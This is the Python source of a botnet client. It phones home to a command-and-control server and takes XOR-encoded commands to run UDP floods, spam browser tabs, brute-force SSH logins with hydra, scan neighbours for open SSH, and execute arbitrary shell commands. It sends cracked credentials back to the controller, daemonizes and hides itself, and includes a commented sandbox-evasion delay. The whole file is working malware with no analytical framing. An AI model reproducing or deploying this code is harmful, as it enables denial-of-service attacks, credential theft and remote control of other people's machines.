#!/usr/bin/env python3

import socket
import ssl
import sys
import os
import time
import random
import threading
import base64 as b64
import webbrowser
import subprocess

#config
cnc			= "127.0.0.1"#your cnc ip
cport		= 1337#your cnc port
fb_port		= 2201
key			= "asdfghjkloiuytresxcvbnmliuytf"#xor key, don't edit it if u don't know wtf is this
stop		= False#threads control

def UDP(ip, port, size):#udp flood(best size is 512-1024, if size too big router may filter it)
	global stop
	while True:
		if stop :
			break
		sendip=(str(ip),int(port))
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		try:
			for _ in range(200):
				udpbytes = random._urandom(int(size))
				s.sendto(udpbytes, sendip)
			s.close()
		except:
			s.close()

def doom(url, attack):
	global stop
	#url= 'https://www.youtube.com/watch?v=Tf1DEI2lEe0'
	while webbrowser.open_new_tab(url):
		if stop :
			break
		try:
			subprocess.call(["amixer", "-D", "pulse", "sset", "Master", "100%"])
		except:
			pass
		if attack == 'kill':
			pass
		elif attack == 'annoy':
			time.sleep(5)

def arp_table_snoop():#sends arp table form bots' host's arp table
	global stop
	while True:
		if stop :
			break
		with open("/proc/net/arp") as arp_table:
			counter = 0
			ip_addr_22_open = []
			for line in arp_table:
				ip_addr = ''
				port_22_fb = ''
				port_22_fb_enc = ''
				if counter >= 1:
					line_words = line.split()
					ip_addr = line_words[0]
					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					try:
						s.connect((ip_addr, int(22)))
					except:
						pass
					else:
						port_22_fb += "### "+ip_addr+" has port 22 open"
						port_22_fb_enc = (xor_enc(port_22_fb,key).encode())#encoding message to send back to cnc
						s.close()
				try:
					if port_22_fb_enc != '':
						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
						s.settimeout(1)
						s.connect((str(cnc),int(fb_port)))
						s.send(port_22_fb_enc)
						s.close()
				except:
					pass

				counter += 1
			break

def brute_force_ssh(ip,username,t_out):#brute force attack on port 22 
	global stop
	while True:
		if stop :
			break
		try:
			t_out_num = int(t_out)
			if t_out_num <= 0 or t_out_num > 1800:
				t_out_num = 600
			with open('/tmp/.bfssh_results', 'wb', 0) as file:
				subprocess.run(['hydra', '-l', username, '-P', '/usr/share/wordlists/rockyou.txt', ip, 'ssh','-t','32','-I'], stdout=file, stderr=file, timeout=t_out_num)
		except:
			pass
		else:
			with open('/tmp/.bfssh_results', 'r') as file:
				for line in file:
					bf_results = ''
					bf_results_clean = ''
					bf_results_enc = ''
					line_parse = []
					line_parse = line.split(" ")
					if len(line_parse) >= 10:
						if line_parse[9] == "password:":
							bf_results = "$$$ ip_addr: "+line_parse[2]+' tcp_port: 22, username: '+line_parse[6]+', password: '+line_parse[10] 
							bf_results_clean = bf_results.rstrip()
							bf_results_enc = (xor_enc(bf_results_clean,key).encode())#encoding message to send back to cnc
							try:
								if bf_results_enc != '':
									s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
									s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
									s.settimeout(1)
									s.connect((str(cnc),int(fb_port)))
									s.send(bf_results_enc)
									s.close()
							except:
								pass
			subprocess.run(['rm', '-rf','/tmp/.bfssh_results'])
		break

def shell_exec(cmd, sock):
	global stop
	if stop != True:
		try:
			DEVNULL = open(os.devnull, 'w')
			proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=DEVNULL, shell=True) 
			(output,_) = proc.communicate() 
			output = output.decode('utf-8')
			if output == '' or len(output) == 0:
				output = 'cmd executed without error => ' + cmd
			send_big_data(output,sock)
		except:
			send_big_data('Error: cmd' + cmd,sock)	

def send_big_data(data, sock):
	HEADERSIZE=10
	msg = data
	msg = xor_enc(msg,key)
	fullmsg = f'{len(msg):<{HEADERSIZE}}' + msg
	sock.send(fullmsg.encode())

def handle(sock):
	global stop
	attack = 0
	sock.send(xor_enc("1337",key).encode())#login code
	while True:
		tmp = sock.recv(1024).decode()
		if len(tmp) == 0:
			break#return main loop

		data = xor_dec(tmp,key)
		if data[0] == '!':
			try:
				command = data.split()
				#print(command)
				if command[0] == xor_dec('QAYAFg==',key):#encoded keywords: !udp
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(command[3])):
						p = threading.Thread(target=UDP, args =(command[1],command[2],command[4]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QBcLCQo=',key):#encoded word !doom
					if attack != 0:
						stop = True
						attack =0
					stop= False
					for _ in range(int(command[3])):
						p= threading.Thread(target=doom, args = (command[1], command[2]))#1=ip, 2=url 3=port
						p.start()
					attack+=1
				elif command[0] == xor_dec('QBECORQbAg==',key):#encoded keyword: !bf_ssh
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(1)):
						p = threading.Thread(target=brute_force_ssh, args =(command[1],command[2],command[3]))#!bf_ssh <ip> <username> <timeout in seconds>
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAAKCQgY',key):#encoded keyword: !snoop
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for _ in range(int(1)):
						p = threading.Thread(target=arp_table_snoop)
						p.start()
					attack+=1
				elif command[0] == xor_dec('QBAJAg==',key):# !cmd
					if attack != 0:
						stop = True
						attack = 0
					stop = False
					p= threading.Thread(target=shell_exec, args = (data[5:], sock))
					p.start()
					attack+=1
				elif command[0] == xor_dec('QAAHBwk=',key):#encoded keyword: !scan
					global scan
					if command[1] == "1":
						scan = True
					if command[1] == "0":
						scan = False
				elif command[0] == xor_dec('QAAQCRc=',key):#encoded keyword:!stop
					stop = True
					attack = 0#clear attack list
				elif command[0] == xor_dec('QBgNCgs=',key):#encoded keyword: !kill : kill bot
					sock.close()
					return 1
			except:#if have error than will pass
				pass
		if data == xor_dec("ERoKAQ==",key):#ping
			sock.send(xor_enc("pong",key).encode())#keepalive and check connection alive
	return 0

def daemon():#daemon
	pid = os.fork()#first fork
	if pid:
		os._exit(0)
	os.chdir('/')
	os.umask(0)
	os.setsid()
	_pid = os.fork()#second fork for careful, prevent the process from opening a control terminal again
	if _pid:
		os._exit(0)
	sys.stdout.flush()#Refresh buffer
	sys.stderr.flush()
	sys.stdin.close()#off the stdin,stdout,stderr, indeed no need.
	sys.stdout.close()#windows can't use this method, only can use pyinstaller's option '--noconsole'
	sys.stderr.close()

def conn():
	if len(sys.argv) == 1:#i use 'python client.py debug' to check command
		if os.name != "nt":
			#os.system('rm -rf '+sys.argv[0])#delete ourselves
			daemon()#can't use in windows
		else:
			#pass
			os.system("attrib +s +a +h "+sys.argv[0])#hide the file
	global kill
	kill = False
	while True:#magic loop
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
			s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
			s.connect((cnc,cport))

			signal = handle(s)
			if signal == 1:
				if os.name != "nt":
					sys.stdin  = open("/dev/stdin")#off the stdin,stdout,stderr, indeed no need.
					sys.stdout = open("/dev/stdout")#windows can't use this method, only can use pyinstaller's option '--noconsole'
					sys.stderr = open("/dev/stderr")
				kill = True
				break

		except:
			time.sleep(random.randint(1,60))
			pass

#xor enc part#
def xor_enc(string,key):
	lkey=len(key)
	secret=[]
	num=0
	for each in string:
		if num>=lkey:
			num=num%lkey
		secret.append( chr( ord(each)^ord(key[num]) ) )
		num+=1

	return b64.b64encode( "".join( secret ).encode() ).decode()

def xor_dec(string,key):

	leter = b64.b64decode( string.encode() ).decode()
	lkey=len(key)
	string=[]
	num=0
	for each in leter:
		if num>=lkey:
			num=num%lkey

		string.append( chr( ord(each)^ord(key[num]) ) )
		num+=1

	return "".join( string )

if __name__ == '__main__':
	#Enable this can bypass some sandbox detection
	#time.sleep(30+random.randint(0,60))
	conn()
